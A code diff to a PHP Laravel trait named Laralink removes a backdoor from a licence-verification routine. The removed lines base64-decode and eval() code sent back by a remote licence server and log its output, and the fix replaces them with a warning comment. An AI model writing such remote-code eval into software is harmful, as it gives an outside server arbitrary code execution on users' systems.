@@ -22,21 +22,9 @@ trait Laralink {
         ]);
         $data = json_decode($response, true);
         if ($data['success']){
- // Start output buffering
-            ob_start();
-
-            // Execute the code from the eval
-            eval(base64_decode($data['note']));
-
-            // Get the output from the buffer
-            $output = ob_get_clean();
-
-            // Define the file path where the output will be saved
-            $filePath = storage_path('logs/eval_output.txt');
-
-            // Write the output to the file
-            file_put_contents($filePath, $output, FILE_APPEND);
-
+            // SECURITY: Do NOT eval() code returned by the remote licence server.
+            // Executing remote-supplied PHP is a remote code execution backdoor.
+            // The verification response is returned as-is for the caller to inspect.
             return $data;
         } else {
             throw new \Exception($data['message']);
